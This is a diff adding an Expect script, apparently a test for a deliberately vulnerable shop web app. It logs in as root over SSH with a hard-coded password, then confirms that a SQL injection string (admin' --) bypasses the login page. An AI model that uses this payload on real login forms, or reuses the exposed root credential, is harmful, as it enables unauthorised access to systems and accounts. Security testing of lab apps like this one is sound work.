@@ -1,0 +1,59 @@
+#!/usr/bin/expect -f
+
+set timeout 30
+set password {$$R00tbeer02}
+
+spawn ssh root@155.138.197.128
+
+expect {
+    "password:" {
+        send "$password\r"
+    }
+    "yes/no" {
+        send "yes\r"
+        expect "password:"
+        send "$password\r"
+    }
+}
+
+expect "# "
+
+send "echo '=== Testing E-commerce Integration ==='\r"
+expect "# "
+
+# Check homepage shows Sign In for non-logged in users
+send "curl -s http://localhost/ | grep -o 'Sign In' | head -1\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '=== Login and Check Session ==='\r"
+expect "# "
+
+# Login with SQL injection
+send "curl -s -c /tmp/shop_cookies.txt -X POST http://localhost/login.php -d \"username=admin' -- &password=x\" -L | grep -o 'Welcome back\\|Premium Auto Parts' | head -1\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '=== Check Homepage with Session ==='\r"
+expect "# "
+
+# Check homepage shows welcome message when logged in
+send "curl -s -b /tmp/shop_cookies.txt http://localhost/ | grep -o 'Welcome back, admin' | head -1\r"
+expect "# "
+
+send "echo ''\r"
+send "echo '=== Check Profile Page ==='\r"
+expect "# "
+
+# Check dashboard/profile page
+send "curl -s -b /tmp/shop_cookies.txt http://localhost/dashboard.php | grep -o 'My Account\\|Walter Administrator' | head -2\r"
+expect "# "
+
+send "echo ''\r"
+send "echo 'E-commerce flow test complete!'\r"
+expect "# "
+
+send "exit\r"
+expect eof
+
+puts "\nE-commerce integration tested successfully!"
